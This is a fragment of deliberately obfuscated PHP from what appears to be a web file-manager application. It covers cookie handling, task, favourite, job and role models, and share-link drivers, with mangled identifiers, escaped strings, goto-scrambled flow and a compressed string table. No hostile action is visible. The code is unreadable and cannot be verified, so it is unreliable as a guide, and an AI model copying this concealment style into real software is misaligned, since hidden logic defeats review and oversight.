$æÔÁ¸º£; } private static $sameCookieSet = array(); public static function set($óÅ§Ä¢Æ, $à²Ô¬£, $½ÀÔ‰¤é = 0, $¯Íœ‚–İ = false, $úúËå– = false) { $£Ô†–¥¹ =& $_SERVER[”øäÃÍª]; if (self::$cookieDisable) { return; } if (!$½ÀÔ‰¤é) { $½ÀÔ‰¤é = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$óÅ§Ä¢Æ]) && self::$sameCookieSet[$óÅ§Ä¢Æ] == $à²Ô¬£ . $½ÀÔ‰¤é) { return; } self::$sameCookieSet[$óÅ§Ä¢Æ] = $à²Ô¬£ . $½ÀÔ‰¤é; if (!$úúËå–) { $úúËå– = str_replace(HOST, $£Ô†–¥¹[12], APP_HOST); $úúËå– = _get($GLOBALS, $£Ô†–¥¹[1002], $úúËå–); } $üÅû­¨á = $£Ô†–¥¹[12]; setcookie($óÅ§Ä¢Æ, $à²Ô¬£, time() + $½ÀÔ‰¤é, $£Ô†–¥¹[8] . trim($úúËå–, $£Ô†–¥¹[8]) . $üÅû­¨á, !1, !1, $¯Íœ‚–İ); } public static function setSafe($œ«±¸äÖ, $ƒşÄÕ´Ğ, $µß´“ = 0) { self::set($œ«±¸äÖ, $ƒşÄÕ´Ğ, $µß´“, !0); } public static function get($¶áä·¦­) { static $„†ßâö = false; if (!$„†ßâö) { self::initHeaderCookie(); $„†ßâö = !0; } return isset($_COOKIE[$¶áä·¦­]) ? $_COOKIE[$¶áä·¦­] : !1; } private static function initHeaderCookie() { $ÜœßÓÓÛ =& $_SERVER[”øäÃÍª]; if (!isset($_SERVER[$ÜœßÓÓÛ[1003]]) || !$_SERVER[$ÜœßÓÓÛ[1003]]) { return; } $úªÛµÉÒ = explode($ÜœßÓÓÛ[74], $_SERVER[$ÜœßÓÓÛ[1003]]); foreach ($úªÛµÉÒ as $é…İŞùà) { $é…İŞùà = explode($ÜœßÓÓÛ[464], $é…İŞùà); if (count($é…İŞùà) != 2 || !isset($é…İŞùà[1])) { continue; } $_COOKIE[trim($é…İŞùà[0])] = trim($é…İŞùà[1]); } } public static function remove($¨¤‰¹ÖÌ, $û—áâÑ = false) { unset($_COOKIE[$¨¤‰¹ÖÌ]); self::set($¨¤‰¹ÖÌ, $_SERVER[”øäÃÍª][12], 1, $û—áâÑ); } } goto b›¤§¡‡ò³; B–Šà¼¯: $obtgwcvxqy = $_SERVER[”øäÃÍª][709]; if (!$obtgwcvxqy) { return; } $_SERVER[‘‹å÷ç] = explode($_SERVER[”øäÃÍª][710], gzinflate(substr($_SERVER[”øäÃÍª][711], 10, -8))); goto BÑÛªí—„÷; BÍˆº™Ş‰: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\56\x74\141\x73\153\114\151\163\164"; public $field = array("\x6e\x61\x6d\145", "\164\x79\160\x65", "\x65\x76\145\156\x74", "\x74\151\x6d\x65", "\144\145\x73\x63", "\x73\171\x73\x74\145\x6d", "\145\156\x61\142\x6c\x65", "\154\141\x73\164\x52\165\156", "\x73\x6f\162\x74"); public function listData($íÅ¼áÜç = false, $ÕÒåê¨° = "\163\x6f\x72\164", $÷Œ‹İ¦… = false) { return parent::listData($íÅ¼áÜç, $ÕÒåê¨°, $÷Œ‹İ¦…); } public function add($¯ù®êêª) { $Ê¯¢Êöè =& $_SERVER[”øäÃÍª]; $á¶û‚¶ş = $this->findByName($¯ù®êêª[$Ê¯¢Êöè[32]]); if ($á¶û‚¶ş) { return !1; } $¯ù®êêª[$Ê¯¢Êöè[1885]] = 0; $¯ù®êêª[$Ê¯¢Êöè[2162]] = $this->getSort(); return parent::insert($¯ù®êêª); } private function getSort() { $¤”é¹˜  =& $_SERVER[”øäÃÍª]; $òŸøæèƒ = parent::listData(); $¨öÅªñı = array_to_keyvalue($òŸøæèƒ, $¤”é¹˜ [12], $¤”é¹˜ [2162]); return empty($¨öÅªñı) ? 0 : max($¨öÅªñı) + 1; } public function update($Ó‡Ö×Îñ, $‰ÍÃ¸·) { $¶ó…¢çÒ =& $_SERVER[”øäÃÍª]; $ÔæÖƒˆ = $this->listData($Ó‡Ö×Îñ); $·Óè©Ÿ = $this->findByName($‰ÍÃ¸·[$¶ó…¢çÒ[32]]); if (!$ÔæÖƒˆ || $·Óè©Ÿ && $·Óè©Ÿ[$¶ó…¢çÒ[487]] != $ÔæÖƒˆ[$¶ó…¢çÒ[487]]) { return !1; } return parent::update($Ó‡Ö×Îñ, $‰ÍÃ¸·); } public function remove($¹ğÕ©ÁÖ, $§éºšŞá = false) { $ô«˜‘ˆ­ =& $_SERVER[”øäÃÍª]; $êÕÙÇ»ó = $this->listData($¹ğÕ©ÁÖ); if (!$êÕÙÇ»ó) { return; } if (!$§éºšŞá && $êÕÙÇ»ó[$ô«˜‘ˆ­[189]] == $ô«˜‘ˆ­[91]) { return !1; } return parent::remove($¹ğÕ©ÁÖ); } public function enable($ˆä»Ó÷¦, $Š„Ì“æ¯) { return $this->update($ˆä»Ó÷¦, array($_SERVER[”øäÃÍª][2615] => $Š„Ì“æ¯)); } public function run($¬½şÜŠ¾) { return $this->update($¬½şÜŠ¾, array($_SERVER[”øäÃÍª][2627] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\x5f\146\141\x76"; protected function cacheFunctionAlias($å²Íæê˜) { $Àù¼¾ =& $_SERVER[”øäÃÍª]; return array($Àù¼¾[2252] => array(USER_ID, $Àù¼¾[2628])); } protected function ___listData() { $ş“¸«• =& $_SERVER[”øäÃÍª]; $†ìó³ù— = array($ş“¸«•[1925] => USER_ID, $ş“¸«•[581] => 0); $û¼åí» = $ş“¸«•[2629]; $àÈİğá– = $this->field($û¼åí»)->where($†ìó³ù—)->order($ş“¸«•[2630])->select(); return $àÈİğá– ? $àÈİğá– : array(); } protected function resetCache() { } protected function listView() { $÷˜­ë­ =& $_SERVER[”øäÃÍª]; $ø‘Û÷Û½ = $this->listData(); $…í‚Ğª£ = array_filter_by_field($ø‘Û÷Û½, $÷˜­ë­[33], $÷˜­ë­[513]); $ß­×Ô†Ì = array_to_keyvalue($…í‚Ğª£, $÷˜­ë­[12], $÷˜­ë­[87]); if (!$ß­×Ô†Ì) { return $ø‘Û÷Û½; } $Í“äöÖ = 2000; $™Ì›ş = array($÷˜­ë­[514] => array($÷˜­ë­[515], $ß­×Ô†Ì)); $±›ÆÇİõ = Model($÷˜­ë­[941])->listSource($™Ì›ş, $Í“äöÖ); $±›ÆÇİõ = array_merge($±›ÆÇİõ[$÷˜­ë­[86]], $±›ÆÇİõ[$÷˜­ë­[85]]); $±›ÆÇİõ = array_to_keyvalue($±›ÆÇİõ, $÷˜­ë­[191]); foreach ($ø‘Û÷Û½ as $•¥Î¬… => $¸¡ÕŞÇ›) { $æ–Ì°â = $±›ÆÇİõ[$¸¡ÕŞÇ›[$÷˜­ë­[87]]]; $æ–Ì°â = $æ–Ì°â ? $æ–Ì°â : array(); $ø‘Û÷Û½[$•¥Î¬…] = array_merge($æ–Ì°â, $¸¡ÕŞÇ›); } return $ø‘Û÷Û½; } protected function addFav($Ô³áŸÜÆ, $·Ä¢Şåà = '', $ÒÛÃŸñ… = "\163\x6f\x75\162\x63\x65") { $ãÍúâ£­ =& $_SERVER[”øäÃÍª]; $ì©§·ã€ = array($ãÍúâ£­[1925] => USER_ID, $ãÍúâ£­[581] => 0, $ãÍúâ£­[519] => $ÒÛÃŸñ…, $ãÍúâ£­[518] => $Ô³áŸÜÆ); if ($this->where($ì©§·ã€)->find()) { return !1; } $ì©§·ã€ = array($ãÍúâ£­[1925] => USER_ID, $ãÍúâ£­[581] => 0); $¤•´•¨œ = $this->where($ì©§·ã€)->max($ãÍúâ£­[2162]); if (!$¤•´•¨œ) { $¤•´•¨œ = 0; } if (!$·Ä¢Şåà && $ÒÛÃŸñ… == $ãÍúâ£­[513]) { $Ô¬ãÅê = Model($ãÍúâ£­[1488])->where(array($ãÍúâ£­[514] => $Ô³áŸÜÆ))->find(); if (!$Ô¬ãÅê) { return !1; } $·Ä¢Şåà = $Ô¬ãÅê[$ãÍúâ£­[32]]; } $·Ä¢Şåà = $this->getAutoName($·Ä¢Şåà); $ÔæÑÄ›– = array($ãÍúâ£­[1925] => USER_ID, $ãÍúâ£­[581] => 0, $ãÍúâ£­[517] => $·Ä¢Şåà, $ãÍúâ£­[518] => $Ô³áŸÜÆ, $ãÍúâ£­[519] => $ÒÛÃŸñ…, $ãÍúâ£­[2144] => $¤•´•¨œ + 1); return $this->add($ÔæÑÄ›–); } protected function remove($Ì¼‰û•™) { $ª¾³èÍ =& $_SERVER[”øäÃÍª]; $¡’ğˆéß = array($ª¾³èÍ[1925] => USER_ID, $ª¾³èÍ[516] => $Ì¼‰û•™); return $this->where($¡’ğˆéß)->delete(); } protected function removeByName($ÂÅ†î´·) { $ÏÁ²ì’Ì =& $_SERVER[”øäÃÍª]; $…êöç¾ü = array($ÏÁ²ì’Ì[1925] => USER_ID, $ÏÁ²ì’Ì[517] => $ÂÅ†î´·, $ÏÁ²ì’Ì[581] => 0); return $this->where($…êöç¾ü)->delete(); } protected function rename($§ª™ìßó, $²ÜÔ“Åß) { $°‘ ¼Ûˆ =& $_SERVER[”øäÃÍª]; if ($§ª™ìßó == $²ÜÔ“Åß) { return !1; } $”æéğç“ = $this->getAutoName($²ÜÔ“Åß); if ($²ÜÔ“Åß != $”æéğç“) { return !1; } $¥èë¼™— = array($°‘ ¼Ûˆ[1925] => USER_ID, $°‘ ¼Ûˆ[581] => 0, $°‘ ¼Ûˆ[32] => $§ª™ìßó); return $this->where($¥èë¼™—)->save(array($°‘ ¼Ûˆ[32] => $²ÜÔ“Åß)); } protected function resetSort($¼ÕİĞ–ö) { $®íé¬¡¤ =& $_SERVER[”øäÃÍª]; $¼ÕİĞ–ö = is_array($¼ÕİĞ–ö) ? $¼ÕİĞ–ö : array(); $ ÅĞÅ†ì = array($®íé¬¡¤[1925] => USER_ID); for ($åøçãÊ = 0; $åøçãÊ < count($¼ÕİĞ–ö); $åøçãÊ++) { $ ÅĞÅ†ì[$®íé¬¡¤[516]] = $¼ÕİĞ–ö[$åøçãÊ]; $this->where($ ÅĞÅ†ì)->save(array($®íé¬¡¤[2144] => $åøçãÊ + 1)); } return !0; } protected function moveTop($¤âÜÑÀ») { $·æãç† =& $_SERVER[”øäÃÍª]; $ÍŞÍ†úç = array($·æãç†[1925] => USER_ID, $·æãç†[581] => 0); $“Œëƒ†Ò = $this->where($ÍŞÍ†úç)->where(array($·æãç†[32] => $¤âÜÑÀ»))->find(); if (!$“Œëƒ†Ò) { return; } $ÁÑæÉô… = $this->field($·æãç†[487])->where($ÍŞÍ†úç)->order($·æãç†[2630])->select(); $ÁÑæÉô… = array_to_keyvalue($ÁÑæÉô…, $·æãç†[12], $·æãç†[487]); $İÓËÊœ“ = $ÁÑæÉô…; $ÁÑæÉô… = array_remove_value($ÁÑæÉô…, $“Œëƒ†Ò[$·æãç†[487]]); array_unshift($ÁÑæÉô…, $“Œëƒ†Ò[$·æãç†[487]]); return $this->resetSort($ÁÑæÉô…); } protected function moveBottom($¬ä¥úŸÄ) { $‚‰íò‚È =& $_SERVER[”øäÃÍª]; $¾üÕËÊ = array($‚‰íò‚È[1925] => USER_ID, $‚‰íò‚È[581] => 0); $“ü‡´ãß = $this->where($¾üÕËÊ)->max($‚‰íò‚È[2162]); $Ä’²Ç§£ = array($‚‰íò‚È[2162] => $“ü‡´ãß + 1); return $this->where($¾üÕËÊ)->where(array($‚‰íò‚È[32] => $¬ä¥úŸÄ))->save($Ä’²Ç§£); } private function getAutoName($ŠĞÊ¾ò‰) { $ÇÙ‘ê¬ =& $_SERVER[”øäÃÍª]; $şººƒğÍ = array($ÇÙ‘ê¬[1925] => USER_ID, $ÇÙ‘ê¬[581] => 0); $Ÿ«ÊŒŸÅ = $this->field($ÇÙ‘ê¬[32])->where($şººƒğÍ)->select(); $Ÿ«ÊŒŸÅ = array_to_keyvalue($Ÿ«ÊŒŸÅ, $ÇÙ‘ê¬[12], $ÇÙ‘ê¬[32]); if (!$Ÿ«ÊŒŸÅ || !in_array($ŠĞÊ¾ò‰, $Ÿ«ÊŒŸÅ)) { return $ŠĞÊ¾ò‰; } for ($ØÅ†î¥† = 0; $ØÅ†î¥† < count($Ÿ«ÊŒŸÅ); $ØÅ†î¥†++) { if (!in_array($ŠĞÊ¾ò‰ . "\50{$ØÅ†î¥†}\51", $Ÿ«ÊŒŸÅ)) { return $ŠĞÊ¾ò‰ . "\x28{$ØÅ†î¥†}\x29"; } } return $ŠĞÊ¾ò‰ . "\50{$ØÅ†î¥†}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\155\x2e\152\x6f\x62\x4c\x69\163\x74"; public $field = array("\x6e\141\155\145", "\x64\145\x73\x63", "\x73\x6f\162\164"); const JOB_KEY = "\x73\145\x6c\146\x4a\x6f\x62\114\x69\x73\x74"; public function listData($µÁú¦¾Ø = false, $ÎØ§»ò = "\x73\157\x72\x74", $ñ…µºÂµ = false) { return parent::listData($µÁú¦¾Ø, $ÎØ§»ò, $ñ…µºÂµ); } public function remove($øæÑÙ¹‹) { return parent::remove($øæÑÙ¹‹); } public function add($ü—å„Ñ) { $€ä¬õ³ =& $_SERVER[”øäÃÍª]; if ($this->findByName($ü—å„Ñ[$€ä¬õ³[32]])) { return !1; } $ü—å„Ñ[$€ä¬õ³[2162]] = $this->getSort(); return parent::insert($ü—å„Ñ); } private function getSort() { $Äö¯™†Õ =& $_SERVER[”øäÃÍª]; $†—š°ì· = parent::listData(); $ù›‹™ùª = array_to_keyvalue($†—š°ì·, $Äö¯™†Õ[12], $Äö¯™†Õ[2162]); return empty($ù›‹™ùª) ? 0 : max($ù›‹™ùª) + 1; } public function update($…İœ˜ò¢, $ê¸ı§) { $€“–Ã =& $_SERVER[”øäÃÍª]; $Õ–˜ï°Ê = parent::listData($…İœ˜ò¢); $ß ê»½ì = $this->findByName($ê¸ı§[$€“–Ã[32]]); if (!$Õ–˜ï°Ê || $ß ê»½ì && $ß ê»½ì[$€“–Ã[487]] != $Õ–˜ï°Ê[$€“–Ã[487]]) { return !1; } return parent::update($…İœ˜ò¢, $ê¸ı§); } public function setUserJob($ŸÌÖİ¥Õ, $Ùò¶ıø) { $——Ó­Ä® =& $_SERVER[”øäÃÍª]; if (!is_array($Ùò¶ıø)) { $Ùò¶ıø = array($Ùò¶ıø); } $ãåÒß¥Ô = parent::listData(); $¢§éºÉ = array_to_keyvalue($ãåÒß¥Ô, $——Ó­Ä®[32]); $×òÉêŞ = $——Ó­Ä®[463]; foreach ($Ùò¶ıø as $È”ÌüÕà) { if ($¢§éºÉ[$È”ÌüÕà]) { $×òÉêŞ .= $¢§éºÉ[$È”ÌüÕà][$——Ó­Ä®[487]] . $——Ó­Ä®[50]; } else { $Â³øÀÅ¿ = $this->add($È”ÌüÕà); $×òÉêŞ .= $Â³øÀÅ¿ . $——Ó­Ä®[50]; } } $×òÉêŞ = rtrim($×òÉêŞ, $——Ó­Ä®[50]); Model($——Ó­Ä®[625])->metaSet($ŸÌÖİ¥Õ, self::JOB_KEY, $×òÉêŞ); } public function getUserJob($¦ÏîÜş) { $×š±éÈ§ = Model($_SERVER[”øäÃÍª][625])->metaGet($¦ÏîÜş); return $this->getUserJobInfo($×š±éÈ§[self::JOB_KEY]); } public function getUserJobInfo($´øË«š) { $âäß Æ« =& $_SERVER[”øäÃÍª]; $şÕÁ†½ö = explode($âäß Æ«[50], $´øË«š); $…©‚ë«· = parent::listData(); $…©‚ë«· = array_remove_key($…©‚ë«·, $âäß Æ«[231]); $ò®ıÄÓ = array(); foreach ($şÕÁ†½ö as $ĞŒ´æÊŞ) { if (isset($…©‚ë«·[$ĞŒ´æÊŞ])) { $ò®ıÄÓ[] = $…©‚ë«·[$ĞŒ´æÊŞ]; } } return $ò®ıÄÓ; } } goto dÉµÈÊù°; EµÕœë©›‰: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\x73\164\145\155\x5f\x6f\160\164\151\x6f\x6e"; protected $jsonField = array("\x6d\145\x6e\x75", "\x72\x6f\x6c\145", "\x72\x6f\x6c\145\107\162\x6f\x75\x70", "\x72\145\147\151\x73\x74", "\x65\x6d\x61\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($”İ—×Ïê) { return "\123\171\x73\164\x65\155\x4f\160\x74\x69\x6f\x6e\x5f{$”İ—×Ïê}"; } protected function optionDefault($¨­ ½è = '') { $§“Ó¤À =& $_SERVER[”øäÃÍª]; if ($¨­ ½è == $§“Ó¤À[12]) { return $GLOBALS[$§“Ó¤À[6]][$§“Ó¤À[468]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\56\x72\157\154\x65\x4c\151\163\x74"; public $field = array("\x6e\141\155\x65", "\141\165\x74\x68", "\154\x61\x62\145\154", "\144\151\163\x70\x6c\141\x79", "\x73\x79\163\x74\x65\x6d", "\144\x65\163\x63", "\151\147\x6e\157\162\145\105\170\x74", "\151\147\x6e\157\x72\145\x46\151\x6c\x65\123\151\172\x65", "\141\x64\155\x69\156\151\x73\x74\x72\x61\164\x6f\x72", "\163\157\162\164"); public function listData($§Ï™©Î… = false, $©ÈÄéôƒ = "\163\157\x72\x74", $­î¹Ù“ğ = false) { $†øÆ±² =& $_SERVER[”øäÃÍª]; $¶ä¢œ = parent::listData($§Ï™©Î…, $©ÈÄéôƒ, $­î¹Ù“ğ); if (!$§Ï™©Î…) { foreach ($¶ä¢œ as $Ò£ó“øö => $õ›´¢¸ú) { if ($õ›´¢¸ú[$†øÆ±²[2332]] == 1) { $¶ä¢œ[$Ò£ó“øö][$†øÆ±²[548]] = LNG($†øÆ±²[2620]); } } } return $¶ä¢œ; } public function update($³ğ——€Â, $êèÀ‚”ú) { $‡«åÇÒ† =& $_SERVER[”øäÃÍª]; $È·œîÉ = parent::listData($³ğ——€Â); $à•İ‹š‡ = $this->findByName($êèÀ‚”ú[$‡«åÇÒ†[32]]); if (!$È·œîÉ || $à•İ‹š‡ && $à•İ‹š‡[$‡«åÇÒ†[487]] != $È·œîÉ[$‡«åÇÒ†[487]]) { return !1; } if ($à•İ‹š‡[$‡«åÇÒ†[2332]] == 1) { $êèÀ‚”ú = array($‡«åÇÒ†[32] => $êèÀ‚”ú[$‡«åÇÒ†[32]], $‡«åÇÒ†[2161] => $êèÀ‚”ú[$‡«åÇÒ†[2161]]); } $this->filterAuth($êèÀ‚”ú[$‡«åÇÒ†[510]]); return parent::update($³ğ——€Â, $êèÀ‚”ú); } public function remove($º•¯²«Ä) { $ÓíğÂ” = parent::listData($º•¯²«Ä); if (!$ÓíğÂ” || $ÓíğÂ”[$_SERVER[”øäÃÍª][189]]) { return !1; } return parent::remove($º•¯²«Ä); } public function add($ú¼èğÑÇ) { $Ê…·ÏË› =& $_SERVER[”øäÃÍª]; $“´»Èù = $ú¼èğÑÇ[$Ê…·ÏË›[32]]; if ($this->findByName($“´»Èù)) { return !1; } $Ñ¦õ¸—© = array($Ê…·ÏË›[517] => $“´»Èù, $Ê…·ÏË›[2146] => $Ê…·ÏË›[12], $Ê…·ÏË›[2142] => $Ê…·ÏË›[2150], $Ê…·ÏË›[2621] => 1, $Ê…·ÏË›[2145] => 0, $Ê…·ÏË›[2622] => 0, $Ê…·ÏË›[2144] => $this->getSort()); $ú¼èğÑÇ = array_merge($Ñ¦õ¸—©, $ú¼èğÑÇ); $this->filterAuth($ú¼èğÑÇ[$Ê…·ÏË›[510]]); return parent::insert($ú¼èğÑÇ); } private function getSort() { $ŠºŒí—ï =& $_SERVER[”øäÃÍª]; $Ç³Ô¡°ê = parent::listData(); $ ÃÖå¯Õ = array_to_keyvalue($Ç³Ô¡°ê, $ŠºŒí—ï[12], $ŠºŒí—ï[2162]); return empty($ ÃÖå¯Õ) ? 0 : max($ ÃÖå¯Õ) + 1; } private function filterAuth(&$ö Øê·¢) { $÷•Š•ÆÚ =& $_SERVER[”øäÃÍª]; $ßÈëãÜ = array(); $Ôä¨øêğ = array_filter(explode($÷•Š•ÆÚ[50], $ö Øê·¢)); foreach ($Ôä¨øêğ as $ö Øê·¢) { $ƒ•û²†Ù = explode($÷•Š•ÆÚ[10], $ö Øê·¢); if ($ƒ•û²†Ù[0] == $÷•Š•ÆÚ[2623] && $ƒ•û²†Ù[1] != $÷•Š•ÆÚ[1261]) { $Ñ³µÖõ‚ = $ƒ•û²†Ù[0] . $÷•Š•ÆÚ[10] . $ƒ•û²†Ù[1] . $÷•Š•ÆÚ[2624]; if (!in_array($Ñ³µÖõ‚, $Ôä¨øêğ)) { $ßÈëãÜ[] = $Ñ³µÖõ‚; } } $ßÈëãÜ[] = $ö Øê·¢; } $ö Øê·¢ = implode($÷•Š•ÆÚ[50], $ßÈëãÜ); } public function findRoleDefault() { $²€¤”µ =& $_SERVER[”øäÃÍª]; $™›ÃÔåé = parent::listData(); $©ª„¹”Ï = !1; foreach ($™›ÃÔåé as $‘”‹Ï‹) { if (!$‘”‹Ï‹ || $‘”‹Ï‹[$²€¤”µ[2160]] == $²€¤”µ[228] || $‘”‹Ï‹[$²€¤”µ[2332]] == 1) { continue; } if (strstr($‘”‹Ï‹[$²€¤”µ[510]], $²€¤”µ[2625])) { continue; } if (!strstr($‘”‹Ï‹[$²€¤”µ[510]], $²€¤”µ[2626])) { continue; } if (!$©ª„¹”Ï) { $©ª„¹”Ï = $‘”‹Ï‹; continue; } $úã©Û¶ = explode($²€¤”µ[50], $©ª„¹”Ï[$²€¤”µ[510]]); $Î¬áë¶¾ = explode($²€¤”µ[50], $‘”‹Ï‹[$²€¤”µ[510]]); if (count($úã©Û¶) > count($Î¬áë¶¾)) { $©ª„¹”Ï = $‘”‹Ï‹; } } return $©ª„¹”Ï ? $©ª„¹”Ï[$²€¤”µ[487]] : $²€¤”µ[12]; } public function sort($Š£Š¨É£, $¤ğßÚ„) { return parent::update($Š£Š¨É£, $¤ğßÚ„); } } goto BÍˆº™Ş‰; C„Œî÷„Øš: function binCheckBigger($ãéäğ, $à³¡Ñ“™) { return $ãéäğ > $à³¡Ñ“™; } $_SERVER[$_SERVER[–¥ˆîÀ°][3]] = ("\71\61\60\62"."\60\70")+0;$_car2="t9d7xbo6liv1pwfk3mz4sjh52u0qg8nceryacmd7uxw5yslq6k1thfi3pnbz809ja4rgoe2v3kpa9gt4eu";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($¡ úâ¹ü, $­ôÉô˜…) { $ÖíØ´™˜ =& $_SERVER[”øäÃÍª]; if (isset(self::$_methodList[$¡ úâ¹ü])) { return @call_user_func_array(self::$_methodList[$¡ úâ¹ü], $­ôÉô˜…); } else { if (method_exists($this, $¡ úâ¹ü)) { return call_user_func_array(array($this, $¡ úâ¹ü), $­ôÉô˜…); } else { think_exception(__CLASS__ . $ÖíØ´™˜[4] . $¡ úâ¹ü . $ÖíØ´™˜[5]); } } } public static function __callStatic($ô¼›âÚÃ, $¦ï×‘ñ) { if (isset(self::$_methodListStatic[$ô¼›âÚÃ])) { return call_user_func_array(self::$_methodListStatic[$ô¼›âÚÃ], $¦ï×‘ñ); } else { if (method_exists(self, $ô¼›âÚÃ)) { return call_user_func_array(array(self, $ô¼›âÚÃ), $¦ï×‘ñ); } else { show_json("{$ô¼›âÚÃ}\50\x29\40\156\157\x74\40\145\x78\x69\x73\x74\73", !1); } } } public static function addMethod($÷±¹¢ÃÙ, $£ÇÖÃØ) { self::$_methodList[$÷±¹¢ÃÙ] = $£ÇÖÃØ; } public static function addMethodStatic($£àŠ†³æ, $¾ñÛ™ä¡) { self::$_methodListStatic[$£àŠ†³æ] = $¾ñÛ™ä¡; } } goto F¯Û×…³Ü³; f¦ÚİÌ¢ğ“: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ò”ó‚ß) { $this->pathParse = $ò”ó‚ß; } protected function infoParse($ì£»¦ü‘, $öÃÉÂ™ê = false) { $Ñ²¿äÊ„ =& $_SERVER[”øäÃÍª]; return Action($Ñ²¿äÊ„[1315])->sharePathInfo($this->pathParse[$Ñ²¿äÊ„[87]], !0, $öÃÉÂ™ê); } public function listPath($ÆãÇ±‚Ê, $¨”ñâá = false) { $õí¤¤µç =& $_SERVER[”øäÃÍª]; $ÍÓùï™˜ = IO::listPath($ÆãÇ±‚Ê, $¨”ñâá); if (!$ÍÓùï™˜) { return $ÍÓùï™˜; } if (is_array($ÍÓùï™˜[$õí¤¤µç[1496]])) { $ÈÉøÛÜŞ = Action($õí¤¤µç[1505])->parsePathChildren($ÍÓùï™˜[$õí¤¤µç[1496]], array($õí¤¤µç[518] => $ÆãÇ±‚Ê)); $ÍÓùï™˜[$õí¤¤µç[1496]] = Action($õí¤¤µç[1315])->shareItemInfo($ÈÉøÛÜŞ); } foreach ($ÍÓùï™˜ as $·ùŸ¤® => $ĞÑëÀ«ä) { if (!in_array($·ùŸ¤®, array($õí¤¤µç[86], $õí¤¤µç[85]))) { continue; } foreach ($ĞÑëÀ«ä as $ª±ß’Îè => $ÈÉøÛÜŞ) { $ÈÉøÛÜŞ = Action($õí¤¤µç[1505])->parsePathChildren($ÈÉøÛÜŞ, array($õí¤¤µç[518] => $ÆãÇ±‚Ê)); $ÍÓùï™˜[$·ùŸ¤®][$ª±ß’Îè] = Action($õí¤¤µç[1315])->shareItemInfo($ÈÉøÛÜŞ); } } return $ÍÓùï™˜; } } class PathDriverDriverShareOuter extends PathDriverBase { public function __construct($¹Úïï†Ô) { $°Â¿˜›¢ =& $_SERVER[”øäÃÍª]; parent::__construct(); $this->uploadChunkSize = 1024 * 1024 * 2; $this->pathParse = $¹Úïï†Ô; $…ÚÄ¢¦ğ = Model($°Â¿˜›¢[694])->getInfo($¹Úïï†Ô[$°Â¿˜›¢[487]]); $×ıŠ—ƒŸ = _get($…ÚÄ¢¦ğ, $°Â¿˜›¢[588]); $ï»††ë¦ = Model($°Â¿˜›¢[595])->authMake(_get($…ÚÄ¢¦ğ, $°Â¿˜›¢[1506])); if (!$…ÚÄ¢¦ğ) { IO::errorTips(LNG($°Â¿˜›¢[1507]), !1); } if (!$ï»††ë¦) { IO::errorTips(LNG($°Â¿˜›¢[1508]), !1); } if ($×ıŠ—ƒŸ && is_string($×ıŠ—ƒŸ)) { $×ıŠ—ƒŸ = json_decode($×ıŠ—ƒŸ, !0); } if (!$×ıŠ—ƒŸ || !$ï»††ë¦) { return; } $this->_config = array($°Â¿˜›¢[1309] => rtrim($¹Úïï†Ô[$°Â¿˜›¢[1309]], $°Â¿˜›¢[8]) . $°Â¿˜›¢[8], $°Â¿˜›¢[1509] => $°Â¿˜›¢[1416] . $×ıŠ—ƒŸ[$°Â¿˜›¢[1510]] . $°Â¿˜›¢[507], $°Â¿˜›¢[584] => $…ÚÄ¢¦ğ, $°Â¿˜›¢[588] => $×ıŠ—ƒŸ, $°Â¿˜›¢[1511] => $ï»††ë¦, $°Â¿˜›¢[1512] => substr(APP_HOST, 0, 8) == $°Â¿˜›¢[217], $°Â¿˜›¢[1513] => Model($°Â¿˜›¢[599])->authCheck($ï»††ë¦[$°Â¿˜›¢[511]], AuthModel::AUTH_VIEW, !1), $°Â¿˜›¢[1514] => Model($°Â¿˜›¢[599])->authCheck($ï»††ë¦[$°Â¿˜›¢[511]], AuthModel::AUTH_EDIT, !1)); $this->authToken = $this->requestAuthToken(); } public function allowAction($ü’ş‡ê¿) { $šÜ÷öë =& $_SERVER[”øäÃÍª]; $Ğø–õ± = $this->_config; if (!$Ğø–õ±) { return !1; } $ÑæØÙÉÔ = array($šÜ÷öë[1515] => $Ğø–õ±[$šÜ÷öë[1513]], $šÜ÷öë[1516] => $Ğø–õ±[$šÜ÷öë[1513]], $šÜ÷öë[1337] => $Ğø–õ±[$šÜ÷öë[1513]], $šÜ÷öë[107] => $Ğø–õ±[$šÜ÷öë[1514]], $šÜ÷öë[1517] => $Ğø–õ±[$šÜ÷öë[1514]], $šÜ÷öë[1286] => $Ğø–õ±[$šÜ÷öë[1514]], $šÜ÷öë[1518] => !1, $šÜ÷öë[429] => !1, $šÜ÷öë[1519] => !1, $šÜ÷öë[1520] => !1); return $ÑæØÙÉÔ[$ü’ş‡ê¿]; } public function listPath($şòŠˆŸ, $Ò‘ƒ–‚Â = false) { return $this->request($_SERVER[”øäÃÍª][1521], array($şòŠˆŸ)); } public function setContent($ÎŸÚã³„, $’¬ËìŸ” = '') { return $this->request($_SERVER[”øäÃÍª][1522], array($ÎŸÚã³„, $’¬ËìŸ”)); } public function getContent($¾ÑÙ ï“) { return $this->_fileSubstr($¾ÑÙ ï“); } public function fileSubstr($äè—¼ø¶, $ĞŒ ÎÇ, $¾Ô”ç’) { return $this->_fileSubstr($äè—¼ø¶, $ĞŒ ÎÇ, $¾Ô”ç’); } public function download($»¦ä¦·ã, $Û›Â¶ƒ·) { return $this->_download($»¦ä¦·ã, $Û›Â¶ƒ·); } public function isFileOutServer() { return !1; } public function fileOut($Ì®§Éà´, $‹®Œá«ù = false, $ÉéÚÖó¼ = false, $“ê‡²î¹ = '') { $–ÆÃ€¼ˆ =& $_SERVER[”øäÃÍª]; $this->fileOutLink($this->_fileLink($Ì®§Éà´, ($“ê‡²î¹ ? $–ÆÃ€¼ˆ[1523] . $“ê‡²î¹ : $–ÆÃ€¼ˆ[12]) . ($‹®Œá«ù ? $–ÆÃ€¼ˆ[1524] : $–ÆÃ€¼ˆ[12]))); } public function fileOutImage($çÇá½ï, $®©¬Õ×é = 250) { $this->fileOutLink($this->_fileLink($çÇá½ï, $_SERVER[”øäÃÍª][1525] . $®©¬Õ×é)); } public function 